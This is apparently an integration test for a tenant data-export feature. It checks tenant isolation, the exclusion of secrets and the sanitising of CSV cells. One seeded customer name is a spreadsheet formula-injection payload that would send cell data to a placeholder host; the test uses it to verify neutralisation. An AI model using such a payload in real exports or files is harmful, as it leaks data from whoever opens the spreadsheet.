/**
 * Full firm export and usage on the isolated local test database only: the ZIP for firm A holds
 * A's rows, none of firm B's, no secrets (password hash, invitation token), and the usage
 * metrics count A only.
 */
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { strFromU8, unzipSync } from 'fflate';
import postgres from 'postgres';

import { localTestDatabaseURL } from './local-test-database';

async function main() {
  process.env.DATABASE_URL = localTestDatabaseURL();
  const db = postgres(process.env.DATABASE_URL, { onnotice: () => {} });
  try {
    assert.equal((await db`SELECT current_database() AS name`)[0].name, 'renkflow_test');
    const { tenantExportStream } = await import('../lib/features/account/export.server');
    const { collectTenantUsage } = await import('../lib/features/account/usage.server');

    const firms: Record<'a' | 'b', { tenantId: string; ownerId: string; marker: string; customerId: string; orderId: string; inviteToken: string; password: string }> = {} as never;
    for (const key of ['a', 'b'] as const) {
      const tenantId = randomUUID();
      const ownerId = randomUUID();
      const marker = `Firma-${key.toUpperCase()}-${tenantId.slice(0, 8)}`;
      const password = `$2b$10$hash-${key}-${randomUUID()}`;
      const inviteToken = `invite-${key}-${randomUUID()}`;
      await db`INSERT INTO tenants (id, name, slug) VALUES (${tenantId}, ${marker}, ${'export-' + tenantId.slice(0, 8)})`;
      await db`INSERT INTO users (id, email, name, password, verification_token) VALUES (${ownerId}, ${`owner-${ownerId}@test.local`}, ${marker + ' Sahip'}, ${password}, ${'verify-' + randomUUID()})`;
      await db`INSERT INTO tenant_members (tenant_id, user_id, role) VALUES (${tenantId}, ${ownerId}, 'owner')`;
      await db`INSERT INTO invitations (tenant_id, email, token, expires_at) VALUES (${tenantId}, ${`new-${tenantId}@test.local`}, ${inviteToken}, now() + interval '1 day')`;
      const [c] = await db`INSERT INTO customers (tenant_id, full_name, email) VALUES (${tenantId}, ${marker + ' Müşteri, "Ltd"'}, ${`c-${tenantId}@test.local`}) RETURNING id`;
      const [o] = await db`INSERT INTO orders (tenant_id, order_number, customer_id, customer_name, status, total_amount) VALUES (${tenantId}, ${'EXP-' + tenantId.slice(0, 8)}, ${c.id}, ${marker}, 'approved', 100) RETURNING id`;
      firms[key] = { tenantId, ownerId, marker, customerId: c.id, orderId: o.id, inviteToken, password };
    }
    const a = firms.a;
    const b = firms.b;
    // Formula-looking text (S-07): neutralised in tables/, byte-exact in raw/.
    const formulaName = `=HYPERLINK("https://example.test/?d="&A1,"tıkla") ${a.marker}`;
    const [formulaCustomer] = await db`INSERT INTO customers (tenant_id, full_name, phone, address) VALUES (${a.tenantId}, ${formulaName}, '+90 555 000 00 00', '-12.5') RETURNING id`;

    let summary: { rowCounts: Record<string, number>; fileCount: number } | null = null;
    const stream = tenantExportStream(db, a.tenantId, { now: new Date('2026-10-26T12:00:00Z'), onDone: (s) => { summary = s; } });
    const zip = new Uint8Array(await new Response(stream).arrayBuffer());
    const files = unzipSync(zip);
    const names = Object.keys(files);
    for (const n of ['README.txt', 'tenant.csv', 'members.csv', 'files.csv', 'tables/customers.csv', 'tables/orders.csv', 'tables/invitations.csv']) assert.ok(names.includes(n), `${n} in the archive`);
    for (const n of ['tables/user_sessions.csv', 'tables/user_mfa.csv', 'tables/sso_providers.csv', 'tables/tenant_members.csv']) assert.ok(!names.includes(n), `${n} left out`);
    assert.ok(summary, 'onDone reports the summary');
    for (const n of names.filter((x) => !x.startsWith('raw/') && x.endsWith('.csv'))) assert.ok(names.includes(`raw/${n}`), `raw/${n} in the archive`);
    assert.equal(names.filter((x) => x.startsWith('raw/')).length, names.filter((x) => !x.startsWith('raw/') && x.endsWith('.csv')).length, 'one raw copy per CSV');

    const safeCustomers = strFromU8(files['tables/customers.csv']);
    const rawCustomers = strFromU8(files['raw/tables/customers.csv']);
    const row = (csv: string) => csv.split('\r\n').find((l) => l.startsWith(formulaCustomer.id))!;
    const quoted = (s: string) => `"${s.replace(/"/g, '""')}"`;
    assert.ok(row(safeCustomers).includes(`,${quoted("'" + formulaName)},`), 'formula text gets a leading apostrophe in tables/');
    assert.ok(row(safeCustomers).includes(",'+90 555 000 00 00,"), 'a phone starting with + is neutralised');
    assert.ok(row(safeCustomers).includes(',-12.5,'), 'a plain number stays as it is');
    assert.ok(row(rawCustomers).includes(`,${quoted(formulaName)},`) && row(rawCustomers).includes(',+90 555 000 00 00,'), 'raw/ keeps the value exactly');
    assert.ok(!rawCustomers.includes("'="), 'raw/ has no apostrophes added');
    // Rows without formula-looking text are identical in both copies; orders' numeric totals too.
    assert.equal(strFromU8(files['raw/tables/orders.csv']), strFromU8(files['tables/orders.csv']));
    assert.equal(strFromU8(files['raw/tenant.csv']), strFromU8(files['tenant.csv']));
    assert.ok(strFromU8(files['README.txt']).includes('raw/'), 'README explains the two copies');

    const all = names.map((n) => strFromU8(files[n])).join('\n');
    // Firm A is there…
    assert.ok(strFromU8(files['tenant.csv']).includes(a.marker));
    assert.ok(strFromU8(files['tables/customers.csv']).includes(`"${a.marker} Müşteri, ""Ltd"""`), 'CSV quoting');
    assert.ok(strFromU8(files['tables/orders.csv']).includes(a.orderId));
    assert.ok(strFromU8(files['members.csv']).includes(`owner-${a.ownerId}@test.local`));
    assert.ok(strFromU8(files['README.txt']).includes('2026-10-26T12:00:00.000Z'));
    // …firm B is not, anywhere.
    for (const needle of [b.tenantId, b.marker, b.customerId, b.orderId, b.ownerId, b.inviteToken]) assert.ok(!all.includes(needle), `firm B value ${needle} leaked`);
    // Secrets never leave, even A's own.
    for (const needle of [a.password, a.inviteToken, 'verify-']) assert.ok(!all.includes(needle), `secret ${needle} exported`);
    const header = strFromU8(files['tables/invitations.csv']).split('\r\n')[0];
    assert.ok(!header.split(',').includes('token'));
    assert.ok(!strFromU8(files['members.csv']).split('\r\n')[0].includes('password'));
    // Every exported table has a tenant_id column and only A's id in it.
    for (const n of names.filter((x) => x.startsWith('tables/'))) {
      const lines = strFromU8(files[n]).split('\r\n').filter(Boolean);
      const idx = lines[0].split(',').indexOf('tenant_id');
      assert.ok(idx >= 0, `${n} has tenant_id`);
      for (const line of lines.slice(1)) assert.ok(line.includes(a.tenantId), `${n} row belongs to A`);
    }

    const usage = await collectTenantUsage(db as never, a.tenantId, { dailyBudgetUsd: 5 });
    assert.equal(usage.firmName, a.marker);
    assert.equal(usage.activeMembers, 1);
    assert.equal(usage.ordersThisMonth, 1);
    assert.equal(usage.ai.dailyBudgetUsd, 5);
    assert.equal(usage.ai.monthSpendUsd, 0);
    assert.equal(usage.files.count, 0);
    assert.ok(usage.firmCreatedAt);

    console.log('tenant export: ok');
  } finally {
    await db.end({ timeout: 5 });
  }
}

main().then(() => process.exit(0)).catch((error) => {
  console.error(error);
  process.exit(1);
});
